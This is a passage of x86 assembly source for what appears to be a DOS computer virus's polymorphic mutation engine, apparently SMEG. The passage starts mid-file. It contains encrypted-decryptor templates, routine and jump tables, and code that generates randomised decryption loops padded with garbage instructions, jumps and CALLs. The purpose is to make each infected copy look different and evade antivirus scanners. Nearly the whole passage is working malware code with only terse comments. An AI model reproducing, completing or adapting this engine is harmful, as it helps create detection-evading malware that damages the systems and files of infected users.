        db       31h,42h,0E4h,0Dh,0DDh,0B0h,0A0h,80h,0B0h,0C0h,0BFh,60h
        db       20h,40h,20h,50h,-1
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
routine0:
        db       20h
        ; MOV reg0,encryption value     (E)
        ; XCHG reg2,reg0                (0C)
        ; MOV reg0,CS                   (1)
        ; MOV reg7,initial pointer      (3)
        ; MOV DS,reg0                   (2)
        ; MOV reg1,initial counter      (4)
        ; beginning of loop             (0)
        ; XCHG reg0,[reg7+offset]       (01)
        ; XCHG reg2,reg0                (0C)
        ; XOR reg2,reg0                 (F)
        ; DEC reg1                      (D)
        ; XCHG reg2,reg0                (0C)
        ; XCHG reg0,[reg7+offset]       (01)
        ; XCHG reg2,reg0                (0C)
        ; MOV reg2,reg1                 (8)
        ; INC reg7                      (C)
        ; INC reg2                      (0D)
        ; INC reg2                      (0D)
        ; INC reg2                      (0D)
        ; INC reg0                      (02)
        ; XCHG reg2,reg0                (0C)
        ; MOV reg1,reg0                 (0E)
        ; AND reg1,reg1                 (0F)
        ; done                          (-1)
        ; return code 0                 (0)
        db       0E0h,0C1h,32h,40h,0,10h,0CFh,0D0h,0C0h,10h,0C8h,0C0h,0D0h
        db       0D0h,0D0h,20h,0C0h,0E0h,0F0h,-1,0
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
routine6:
        db       55h
        ; MOV reg1,initial counter      (4)
        ; MOV reg7,initial pointer      (3)
        ; MOV reg0,CS                   (1)
        ; MOV DS,reg0                   (2)
        ; MOV reg0,encryption value     (E)
        ; MOV reg7,initial pointer      (3)
        ; beginning of loop             (0)
        ; MOV reg2,[reg7+offset]        (5)
        ; DEC reg1                      (D)
        ; SUB reg2,reg0                 (07)
        ; INC reg0                      (02)
        ; SUB reg1,1                    (05)
        ; MOV [reg7+offset],reg2        (6)
        ; INC reg7                      (C)
        ; DEC reg1                      (D)
        ; done                          (-1)
        db       43h,12h,0E3h,5h,0D0h,70h,20h,56h,0CDh,-1
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
routineA:
        db       47h
        ; MOV reg0,encryption value     (E)
        ; MOV reg7,initial pointer      (3)
        ; MOV reg1,initial counter      (4)
        ; XCHG reg2,reg0                (0C)
        ; MOV reg0,CS                   (1)
        ; MOV DS,reg0                   (2)
        ; beginning of loop             (0)
        ; PUSH [reg7+offset]            (08)
        ; POP reg0                      (0B)
        ; XCHG reg2,reg0                (0C)
        ; XOR reg2,reg0                 (F)
        ; MOV [reg7+offset],reg2        (6)
        ; MOV reg2,reg1                 (8)
        ; DEC reg1                      (D)
        ; DEC reg0                      (03)
        ; INC reg2                      (0D)
        ; INC reg2                      (0D)
        ; INC reg2                      (0D)
        ; XCHG reg2,reg0                (0C)
        ; MOV reg1,reg0                 (0E)
        ; ADD reg7,1                    (04)
        ; AND reg1,reg1                 (0F)
        ; done                          (-1)
        ; return code 0                 (0)
        db       0E3h,40h,0C1h,20h,0h,80h,0B0h,0CFh,68h,0D0h,30h,0D0h,0D0h
        db       0D0h,0C0h,0E0h,40h,0F0h,-1,0
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
jmp_table:
        dw       offset(jmp0-virus)
        dw       offset(jmp1-virus)
        dw       offset(jmp2-virus)
        dw       offset(jmp3-virus)
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
routine_table:
        dw       offset(routine0-virus)
        dw       offset(routine1-virus)
        dw       offset(routine2-virus)
        dw       offset(routine3-virus)
        dw       offset(routine4-virus)
        dw       offset(routine5-virus)
        dw       offset(routine6-virus)
        dw       offset(routine7-virus)
        dw       offset(routine8-virus)
        dw       offset(routine9-virus)
        dw       offset(routineA-virus)
        dw       offset(routineB-virus)
        dw       offset(routineC-virus)
        dw       offset(routineD-virus)
        dw       offset(routineE-virus)
        dw       offset(routineF-virus)
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
counterinit0:
        neg      ax
counterinit1:
        retn
counterinit2:
        neg      ax
counterinit3:
        add      ax,ax
        retn
counterinit4:
        neg      ax
counterinit5:
        mov      cx,ax
        add      ax,ax
        add      ax,cx
        retn
counterinit6:
        neg      ax
counterinit7:
        add      ax,ax
        add      ax,ax
        retn
jmp0:
        mov      al,0E9h                 ; encode a JMP
        stosb                            ; (with word offset)
        mov      ax,di                   ; calculate offset to
        sub      ax,ds:[loop_top-virus]        ; top of decryption loop
        inc      ax                      ; adjust for jmp instruction
        inc      ax
        neg      ax                      ; adjust for going back instead
        retn                             ; of forwards
jmp1:
        mov      ax,0E0FFh               ; encode JMP register
        or       ah,[si]
        retn
jmp2:
        mov      ax,0C350h                ; encode PUSH/RETn
jmpXdone:
        or       al,[si]
        retn
jmp3:
        mov      al,0Eh                   ; encode PUSH CS
        stosb
        call     garble_some              ; garble a bit
        mov      ax,0CB50h                ; encode PUSH reg/RETN
        jmp      short jmpXdone
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
encode_routine:
        call     random_any_ax           ; pick a random routine
        mov      bx,offset(routine_table-virus) ; to use
        and      ax,0Fh
        add      ax,ax
        add      bx,ax
        mov      bx,[bx]
        mov      si,bx
        lodsb                            ; get the first byte
        mov      ds:[crypt_type-virus],al      ; and save it
        jmp      short encode_routine2   ; keep going...
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
encode_it:
        lodsb                            ; get the next byte
        cmp      ah,-1                   ; are we done?
        je       use_as_is               ; if so, exit
        xor      bh,bh                   ; convert AL to
        add      al,al                   ; offset in encode_table
        mov      bl,al
        add      bx,offset(encode_table-virus)
        mov      al,dh
        mov      cx,3
        mov      bx,[bx]
        call     bx
        xchg     ah,al
        stosb                           ; write the resulting byte
use_as_is:
        retn
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
fill_mod_field:
        ror      al,cl
fill_field:
        and      al,7h                   ; get the register # al
        mov      bx,offset(dataarea_for_SMEG-virus+6)
        xlat
        rol      al,cl
        and      cl,cl                   ; encoding rm or reg?
        jnz      not_memory              ; branch if doing rm
        test     dh,40h                  ; memory access?
        jz       not_memory
        cmp      al,3h                   ; using bx?
        jne      not_BX
        mov      al,7h                   ; change it to di
        jmp      short not_memory
not_BX:
        cmp      al,6h                   ; is it si?
        jb       not_memory
        sub      al,2h                   ; change it to double register
not_memory:
        or       ah,al
        retn
fill_reg_reg1:
        ror      al,cl                   ; [reg], reg
fill_reg_field:
        xor      cl,cl                   ; fill bottom 3 bits only
        jmp      short fill_field
fill_mod_n_reg:
        call     fill_mod_field          ; fill mod field as usual
        mov      al,dh                   ; fill reg field with the
        jmp      short fill_reg_field    ; register that holds the
fill_reg_reg2:
        call     fill_field
        mov      al,dh
        jmp      short fill_reg_reg1
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
encode_routine2:
        mov      word ptr ds:[which_tbl-virus],offset(encode_tbl1-6h-virus)
process_all:
        lodsb                            ; get a byte
        cmp      al,-1                   ; are we at the end?
        jne      process_byte            ; no, keep going
        lodsb                            ; else get returncode and exit
        retn
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
process_byte:
        push     si ax
        mov      cl,4
        call     process_nibble
        xor      cl,cl
        pop      ax
        call     process_nibble
        pop      si
        jmp      short process_all
process_nibble:
        ror      al,cl                   ; only use the part of
        and      ax,0Fh                  ; the byte that we want
        jnz      no_switch_table
        and      cl,cl                   ; if the lower half of byte=0,
        jz       switch_tables           ; switch tables
        mov      ds:[loop_top-virus],di        ; otherwise save this location
        retn                             ; as the top of the loop
switch_tables:
        mov      word ptr ds:[which_tbl-virus],offset(encode_tbl2-6-virus)
        retn
no_switch_table:
        push     ax
        call     garble_more
        pop      ax
        add      ax,ax                   ; calculate AX*6+ds:[which_tbl--virus]
        mov      bx,ax
        add      ax,ax
        add      ax,bx
        add      ax,ds:[which_tbl-virus]
        mov      word ptr ds:[which_tbl-virus],offset(encode_tbl1-6h-virus)
        xchg     si,ax
        lodsb
        mov      dh,al                   ; dh holds first byte
        lodsb
        xchg     ah,al                   ; ah holds second byte
        call     encode_it               ; process it
        lodsb                            ; now ah holds the next byte
        xchg     ah,al
        call     encode_it               ; process it
        lodsb                            ; get the next byte
        mov      dl,al                   ; it tells us which
        and      ax,0Fh                  ; value to write in
        add      ax,ax                   ; this is the modifier
        add      ax,offset(write_table-virus)
        xchg     bx,ax                   ; value, etc.
        mov      bx,[bx]
        jmp      bx
write_nothing:
        retn
write_cryptval:
        mov      al,ds:[cryptval-virus]
        stosb
        retn
write_pointer_patch:    ; save location of pointer initialisation
        mov      ds:[pointer_patch-virus],di
        stosw
        retn
write_counter_patch:    ; save location of counter initialisation
        mov      ds:[counter_patch-virus],di
        stosw
        retn
write_ptr_offset:       ; write XXXX of [bx+XXXX]
        mov      ax,ds:[ptr_offsets-virus]
        mov      ds:[pointer_fixup-virus],ax
        stosw
        retn
write_dl:
        mov      al,dl                   ; write lower half of top
        mov      cl,4                    ; byte of dl as a word
        shr      al,cl                   ; used as amount to increment
        and      ax,0Fh
        stosw
        retn
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
garble_some:
        push     si
        mov      dx,3                    ; garble 2-5 times
        call     multiple_garble
        pop      si
        retn
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
garble_more:
        mov      dx,7h
multiple_garble:
        call     random_dx
        inc      dx
        inc      dx
        xchg     cx,dx
garble_again:
        push     cx                      ; save garble count
        call     garble_once             ; garble
        pop      cx                      ; restore garble count
        loop     garble_again
        cmp      ds:[cJMP_patch-virus],cx      ; cJMP_patch == 0? i.e. is
        je       skip_finish_cJMP        ; there an unfinished cJMP?
        call     finish_cJMP             ; if so, finish it
skip_finish_cJMP:
        call     many_nonbranch_garble   ; garble garble
        mov      bx,ds:[nJMP_patch-virus]      ; check if pending nJMP
        and      bx,bx
        jnz      loc_0047                ; if so, keep going
        retn
loc_0047:                                ;  xref 4028:0996
        mov      al,0C3h                 ; encode a RETN
        stosb
        mov      ax,di
        sub      ax,bx
        dec      ax
        dec      ax
        mov      [bx],ax
        mov      ds:[CALL_patch-virus],bx
        mov      word ptr ds:[nJMP_patch-virus],0
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
many_nonbranch_garble:
        call     random_any_ax                 ; do large instruction
        and      ax,3                    ; garble from 3 to 6 times
        add      al,3
        xchg     cx,ax
many_nonbranch_garble_loop:
        push     cx
        call     not_branch_garble
        pop      cx
        loop     many_nonbranch_garble_loop
        retn
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; finish_cJMP simply encodes a few instructions between the conditional
; jmp and its target, and then sets the destination of the jmp to be after
; the inserted instructions.
finish_cJMP:
        mov      ax,di                   ; get current location
        mov      bx,ds:[cJMP_patch-virus]      ; get previous location
        sub      ax,bx
        dec      al                      ; calculate offset
        jnz      go_patch_cJMP           ; if nothing in between,
        call     not_branch_garble       ; fill in some instructions
        jmp      short finish_cJMP       ; and do this again
go_patch_cJMP:
        cmp      ax,7Fh                  ; are we close enough?
        jbe      patch_cJMP              ; if so, finish this now
        xor      al,al                   ; if not, encode cJMP $+2
patch_cJMP:
        mov      [bx],al                 ; patch the cJMP destination
        mov      word ptr ds:[cJMP_patch-virus],0 ; clear usage flag
        retn
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
set_reg_mask:
        and      cl,0F8h                  ; clear bottom 3 bits
        mov      bx,offset(dataarea_for_SMEG-virus+6)
        mov      dh,7h                    ; assume one of 8 registers
        test     dl,4h                    ; can we use any register?
        jnz      set_reg_mask_exit       ; if so, quit
        add      bx,3     ; otherwise, set mask so we
        mov      dh,3                    ; only choose from regs 3-6
set_reg_mask_exit:
        retn
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
choose_register:
        call     random_any_ax           ; get random number
        xor      ah,ah                   ; clear high byte
        and      al,dh                   ; use mask from set_reg_mask
        add      bx,ax
        mov      al,[bx]                 ; get the register number
        test     ch,1                    ; byte or word register?
        jnz      choose_reg_done         ; if word, we are okay
        test     byte ptr [si-2],4       ; otherwise, check if we can
        jnz      choose_reg_done         ; take only half the register
        mov      ah,al                   ; uh oh, we can't, so...
        and      al,3                    ; is it one of the garbage
        cmp      al,ds:[dataarea_for_SMEG-virus+9h]
        mov      al,ah                   ; if so, we are done
        jz       choose_reg_done
        mov      al,ds:[dataarea_for_SMEG-virus+9h]
        cmp      al,4                    ; ax,cx,dx, or bx?
        jb       werd                    ; to yer muthah!
        pop      ax                      ; pop off return location
        retn                             ; go to caller's caller
werd:
        and      ah,4                    ; make either byte or word
        or       al,ah                   ; register
choose_reg_done:
        retn
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
garble_once:
        call     random_any_ax
        cmp      ah,0C8h                 ; randomly go to either
        jbe      other_garble            ; here ...
        jmp      branch_garble           ; ... or here
not_branch_garble:
        call     random_any_ax
other_garble:
        cmp      al,0F0h
        jbe      larger_instr            ; mostly do larger instructions
        jmp      do_one_byte             ; 1/16 chance
        ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
        ;‡ ¬ãá®p¨¬ ¡®«ìè®© ¨­áâpãªæ¨¥©
larger_instr:
        and      ax,1Fh                  ; normalise random number
        add      ax,ax
        add      ax,offset(garble_table-virus)
        xchg     si,ax
        lodsw    ;AX=DS:[SI]             ; get table entry
        xchg     cx,ax                   ; keep it in CX
        mov      dl,cl                   ; pick out the bottom
        and      dl,3                    ; mask out low 2 bits
        xor      dh,dh
        call     random_dx
        or       ch,dl                   ; byte for variable opcodes
                                         ; (e.g. allows byte & word
                                         ;  forms of opcode to use the
                                         ;  same table entry)
        mov      dl,cl
        and      dl,0C0h                 ; mask out mod field
        cmp      dl,0C0h                 ; does it indicate register
        mov      dl,cl                   ; operation? i.e. 2 regs
        jz       no_memory               ; if so, branch
        call     set_reg_mask            ; otherwise, process memory
        call     random_any_ax           ; and register operation
        and      al,0C0h                 ; clear all but top 2 bits
        or       cl,al                   ; fill in the field
        rol      al,1
        rol      al,1
        mov      dl,al
        call     random_any_ax           ; generate the registers to use
        and      al,7h                   ; in memory access,i.e. [bx+si]
        or       cl,al                   ; patch into 2nd byte of instr
        cmp      dl,3h
        je       fill_in_rm
        cmp      al,6h
        jne      force_byte
        mov      dl,2h                   ; alter mask to choose AX or DX
        and      cl,3Fh
        jmp      short fill_in_rm
force_byte:
        and      ch,not 1                ; change to byte data
                                         ; "byte sized"
fill_in_rm:
        call     choose_register         ; move register into
        shl      al,1                    ; the rm field
        shl      al,1
        shl      al,1
finish_larger:
        or       cl,al                   ; combine data
        xchg     cx,ax                   ; move it to the right register
        xchg     ah,al                   ; reverse byte order
        stosw                            ; write the instruction
        and      dl,dl                   ; needs data bytes?
        jnz      needs_data
        retn
needs_data:
        cmp      dl,3h                   ; check length of instruction
        jne      do_data_bytes
        retn
do_data_bytes:
        call     random_any_ax           ; keep the random number
        and      al,3Fh                  ; under 40h
        stosb                            ; write the byte
        dec      dl                      ; decrement bytes to write
        jnz      do_data_bytes
        retn
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
no_memory:
        call     set_reg_mask
        call     choose_register
        mov      ah,ch                   ; get the opcode and clear the
        and      ah,0FEh                 ; size bit for now
        cmp      ah,0F6h
        jne      not_NOT_NEG
        test     cl,10h                  ; is it TEST instruction?
        jz       not_NOT_NEG             ; if it is, go find the number
                                         ; of data bytes it needs, else
                                         ; it is NOT or NEG, so there're
no_data_bytes:
        xor      dl,dl                   ; no data bytes
        jmp      short finish_larger
not_NOT_NEG:
        and      ah,0FCh                  ; is it a shift or rotate?
        cmp      ah,0D0h
        jne      set_data_length         ; if not, calculate # data
                                         ; bytes needed, else
        jmp      short no_data_bytes     ; we don't need any
set_data_length:
        test     ch,1                    ; byte or word of data?
        mov      dl,2                    ; assume word
        jnz      finish_larger           ; continue if so
        dec      dl                      ; DEC DX is better!!!
        jmp      short finish_larger     ; otherwise adjust to data
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
do_one_byte:
        and      al,7h
        mov      bx,offset(onebyte_table-virus)
        xlat
        cmp      al,48h                   ; DEC?
        je       inc_or_dec
        cmp      al,40h                   ; or INC?
        jne      encode_1byte
inc_or_dec:
        mov      cl,al
        call     random_any_ax           ; get a garbage register
        and      al,3
        mov      bx,offset(dataarea_for_SMEG-virus+9)
                                         ; can we say "lea", boys and
                                         ; girls?
        xlat                             ; look up the register
        or       al,cl                   ; fill in the register field
encode_1byte:
        stosb
        retn
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
branch_garble:
        cmp      word ptr ds:[cJMP_patch-virus],0 ; is there an unfinished
        je       no_pending_cJMP            ; conditional jmp?
        jmp      finish_cJMP                ; if so, finish it
no_pending_cJMP:
        call     random_any_ax
        cmp      ah,6Eh
        ja       do_near_JMP
do_cond_jmp:
        and      al,0Fh                   ; encode a conditional
        or       al,70h                   ; jmp
        stosb
        mov      ds:[cJMP_patch-virus],di      ; save target offset
        stosb
        retn
do_near_JMP:
        cmp      word ptr ds:[nJMP_patch-virus],0 ; is there an unfinished
        jne      do_cond_jmp                ; near JMP pending?
        call     random_any_ax              ; if not, encode one
        cmp      al,78h                     ; either just jmp past
        jbe      encode_CALL                ; or call it too
        mov      al,0E9h                    ; encode near JMP
        stosb
        mov      ds:[nJMP_patch-virus],di         ; save location to patch
        stosw
        call     random_any_ax
        cmp      al,0AAh
        jbe      forward_CALL
go_not_branch_garble:
        jmp      not_branch_garble
forward_CALL:
        cmp      word ptr ds:[last_CALL-virus],0 ; is there a garbage CALL
        je       go_not_branch_garble      ; we can patch?
        push     di                        ; if there is, patch the CALL
        xchg     di,ax                     ; for here so there are CALLs
        dec      ax                        ; forwards as well as back-
        dec      ax                        ; wards
        mov      di,ds:[last_CALL-virus]
        sub      ax,di
        stosw
        pop      di
        jmp      not_branch_garble
encode_CALL:
        cmp      word ptr ds:[CALL_patch-virus],0 ; is there one pending?
        je       do_cond_jmp
        mov      al,0E8h                    ; encode a CALL
        stosb
        cmp      word ptr ds:[last_CALL-virus],0
        je       store_CALL_loc
        call     random_any_ax              ; 1/2 chance of replacing
        and      al,7h                      ; it (random so it's not
        cmp      al,4h                      ; too predictable)
        jae      fill_in_offset
store_CALL_loc:
        mov      ds:[last_CALL-virus],di          ; save ptr to CALL offset
fill_in_offset:
        mov      ax,di                      ; calculate CALL offset
        sub      ax,ds:[CALL_patch-virus]
        neg      ax
        stosw
        retn
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
